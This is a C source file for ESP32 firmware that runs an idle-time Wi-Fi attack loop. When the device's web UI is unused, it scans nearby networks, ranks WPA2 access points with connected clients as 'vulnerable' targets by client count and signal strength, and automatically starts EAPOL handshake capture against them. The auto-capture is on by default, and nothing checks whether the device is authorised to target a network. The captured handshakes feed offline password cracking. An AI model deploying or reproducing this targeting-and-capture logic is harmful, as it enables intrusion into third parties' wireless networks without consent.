#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "cJSON.h"
#include "idle_scanner.h"
#include "web_server.h"
#include "wifi_scan.h"
#include "handshake.h"
#include "scan_storage.h"
#include "background_scan.h"
#include <string.h>

#define TAG "IdleScanner"
#define IDLE_TASK_STACK 8192
#define CHECK_INTERVAL_MS 5000

static TaskHandle_t idle_task_handle = NULL;
static volatile bool task_running = false;
static volatile idle_scan_state_t scan_state = IDLE_SCAN_OFF;
static idle_scan_config_t config = {
    .idle_threshold_sec = 60,
    .deep_scan_interval_sec = 300,
    .auto_handshake = true,
    .handshake_duration_sec = 30
};

static uint32_t last_deep_scan = 0;
static uint32_t last_handshake_attempt = 0;

#define MAX_ATTEMPTED_BSSIDS 16
static uint8_t attempted_bssids[MAX_ATTEMPTED_BSSIDS][6];
static uint32_t attempted_times[MAX_ATTEMPTED_BSSIDS];
static int attempted_count = 0;

static uint32_t get_uptime_sec(void) {
    return (uint32_t)(esp_timer_get_time() / 1000000ULL);
}

static bool was_recently_attempted(const uint8_t *bssid) {
    uint32_t now = get_uptime_sec();
    for (int i = 0; i < attempted_count; i++) {
        if (memcmp(attempted_bssids[i], bssid, 6) == 0) {
            if ((now - attempted_times[i]) < 3600) return true;
        }
    }
    return false;
}

static void mark_attempted(const uint8_t *bssid) {
    int idx = attempted_count < MAX_ATTEMPTED_BSSIDS ? attempted_count++ : 0;
    if (attempted_count > MAX_ATTEMPTED_BSSIDS) {
        for (int i = 0; i < MAX_ATTEMPTED_BSSIDS - 1; i++) {
            memcpy(attempted_bssids[i], attempted_bssids[i+1], 6);
            attempted_times[i] = attempted_times[i+1];
        }
        idx = MAX_ATTEMPTED_BSSIDS - 1;
    }
    memcpy(attempted_bssids[idx], bssid, 6);
    attempted_times[idx] = get_uptime_sec();
}

bool idle_scanner_is_device_idle(void) {
    uint32_t last_req = webserver_get_last_request_time();
    uint32_t now = get_uptime_sec();
    
    if (last_req == 0) return true;
    return (now - last_req) > config.idle_threshold_sec;
}

static bool find_vulnerable_network(uint8_t *bssid, int *channel) {
    const char *results = wifi_scan_get_results();
    if (!results || strlen(results) < 10) return false;
    
    cJSON *root = cJSON_Parse(results);
    if (!root) return false;
    
    cJSON *rows = cJSON_GetObjectItem(root, "rows");
    if (!rows) {
        cJSON_Delete(root);
        return false;
    }
    
    int best_score = -1;
    uint8_t best_bssid[6] = {0};
    int best_channel = 0;
    char best_mac_str[18] = {0};
    
    cJSON *ap;
    cJSON_ArrayForEach(ap, rows) {
        cJSON *security = cJSON_GetObjectItem(ap, "Security");
        cJSON *mac = cJSON_GetObjectItem(ap, "MAC");
        cJSON *ch = cJSON_GetObjectItem(ap, "Channel");
        cJSON *rssi_obj = cJSON_GetObjectItem(ap, "RSSI");
        cJSON *stations = cJSON_GetObjectItem(ap, "stations");
        
        if (!security || !mac || !ch) continue;
        
        const char *sec_str = security->valuestring;
        if (!sec_str) continue;
        
        if (strstr(sec_str, "WPA3") || strcmp(sec_str, "Open") == 0 || strcmp(sec_str, "WEP") == 0) {
            continue;
        }
        
        if (!strstr(sec_str, "WPA2")) continue;
        
        int client_count = (stations && cJSON_IsArray(stations)) ? cJSON_GetArraySize(stations) : 0;
        if (client_count == 0) continue;
        
        uint8_t tmp_bssid[6];
        if (sscanf(mac->valuestring, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                   &tmp_bssid[0], &tmp_bssid[1], &tmp_bssid[2],
                   &tmp_bssid[3], &tmp_bssid[4], &tmp_bssid[5]) != 6) {
            continue;
        }
        
        if (was_recently_attempted(tmp_bssid)) continue;
        
        int rssi = rssi_obj ? rssi_obj->valueint : -100;
        int rssi_bonus = (rssi > -50) ? 3 : (rssi > -65) ? 2 : (rssi > -75) ? 1 : 0;
        int score = (client_count * 3) + rssi_bonus;
        
        if (score > best_score) {
            best_score = score;
            memcpy(best_bssid, tmp_bssid, 6);
            best_channel = ch->valueint;
            strncpy(best_mac_str, mac->valuestring, sizeof(best_mac_str) - 1);
        }
    }
    
    cJSON_Delete(root);
    
    if (best_score > 0) {
        memcpy(bssid, best_bssid, 6);
        *channel = best_channel;
        mark_attempted(bssid);
        ESP_LOGI(TAG, "Selected target: %s (ch %d, score=%d)", best_mac_str, best_channel, best_score);
        return true;
    }
    
    return false;
}

static void perform_deep_scan(void) {
    ESP_LOGI(TAG, "Starting deep scan...");
    scan_state = IDLE_SCAN_DEEP_SCAN;
    
    wifi_scan();
    
    while (!wifi_scan_is_complete() && task_running) {
        if (!idle_scanner_is_device_idle()) {
            ESP_LOGI(TAG, "User active during scan");
            break;
        }
        vTaskDelay(pdMS_TO_TICKS(200));
    }
    
    wifi_scan_stations();
    
    background_scan_trigger();
    
    last_deep_scan = get_uptime_sec();
    scan_state = IDLE_SCAN_WAITING;
    ESP_LOGI(TAG, "Deep scan complete - UI tables updated");
}

static void attempt_auto_handshake(void) {
    if (!config.auto_handshake) return;
    
    uint8_t bssid[6];
    int channel;
    
    if (!find_vulnerable_network(bssid, &channel)) {
        return;
    }
    
    if (!idle_scanner_is_device_idle()) {
        ESP_LOGI(TAG, "User active, skipping handshake capture");
        return;
    }
    
    ESP_LOGI(TAG, "Starting auto handshake capture on %02X:%02X:%02X:%02X:%02X:%02X ch%d",
             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], channel);
    
    scan_state = IDLE_SCAN_HANDSHAKE;
    
    int eapol_count = 0;
    start_handshake_capture(bssid, channel, config.handshake_duration_sec, NULL, 0, &eapol_count);
    
    if (eapol_count > 0) {
        handshake_record_auto_capture(bssid, channel, eapol_count);
    }
    
    ESP_LOGI(TAG, "Auto handshake complete: %d EAPOL frames", eapol_count);
    last_handshake_attempt = get_uptime_sec();
    scan_state = IDLE_SCAN_WAITING;
}

static void idle_scanner_task(void *arg) {
    ESP_LOGI(TAG, "Idle scanner task started");
    
    while (task_running) {
        for (int i = 0; i < (CHECK_INTERVAL_MS / 100) && task_running; i++) {
            vTaskDelay(pdMS_TO_TICKS(100));
        }
        
        if (!task_running) break;
        
        if (!idle_scanner_is_device_idle()) {
            scan_state = IDLE_SCAN_WAITING;
            continue;
        }
        
        uint32_t now = get_uptime_sec();
        
        if ((now - last_deep_scan) > config.deep_scan_interval_sec) {
            perform_deep_scan();
        }
        
        if (config.auto_handshake && 
            (now - last_handshake_attempt) > (config.deep_scan_interval_sec * 2)) {
            attempt_auto_handshake();
        }
    }
    
    scan_state = IDLE_SCAN_OFF;
    idle_task_handle = NULL;
    vTaskDelete(NULL);
}

esp_err_t idle_scanner_init(void) {
    ESP_LOGI(TAG, "Idle scanner initialized (threshold=%lus, interval=%lus)", 
             (unsigned long)config.idle_threshold_sec, 
             (unsigned long)config.deep_scan_interval_sec);
    return ESP_OK;
}

esp_err_t idle_scanner_start(void) {
    if (idle_task_handle != NULL) {
        return ESP_ERR_INVALID_STATE;
    }
    
    task_running = true;
    scan_state = IDLE_SCAN_WAITING;
    
    BaseType_t ret = xTaskCreate(idle_scanner_task, "idle_scan", IDLE_TASK_STACK, 
                                  NULL, 2, &idle_task_handle);
    
    if (ret != pdPASS) {
        task_running = false;
        scan_state = IDLE_SCAN_OFF;
        return ESP_ERR_NO_MEM;
    }
    
    ESP_LOGI(TAG, "Idle scanner started");
    return ESP_OK;
}

void idle_scanner_stop(void) {
    task_running = false;
    if (idle_task_handle) {
        for (int i = 0; i < 50 && idle_task_handle; i++) {
            vTaskDelay(pdMS_TO_TICKS(100));
        }
    }
    ESP_LOGI(TAG, "Idle scanner stopped");
}

idle_scan_state_t idle_scanner_get_state(void) {
    return scan_state;
}

const idle_scan_config_t* idle_scanner_get_config(void) {
    return &config;
}

void idle_scanner_set_config(const idle_scan_config_t *new_config) {
    if (new_config) {
        memcpy(&config, new_config, sizeof(idle_scan_config_t));
    }
}

void idle_scanner_set_auto_handshake(bool enabled) {
    config.auto_handshake = enabled;
    ESP_LOGI(TAG, "Auto handshake %s", enabled ? "enabled" : "disabled");
}

void idle_scanner_set_idle_threshold(uint32_t seconds) {
    if (seconds < 30) seconds = 30;
    if (seconds > 600) seconds = 600;
    config.idle_threshold_sec = seconds;
    ESP_LOGI(TAG, "Idle threshold set to %lu seconds", (unsigned long)seconds);
}

void idle_scanner_set_handshake_duration(uint8_t seconds) {
    if (seconds < 10) seconds = 10;
    if (seconds > 120) seconds = 120;
    config.handshake_duration_sec = seconds;
    ESP_LOGI(TAG, "Handshake duration set to %u seconds", seconds);
}
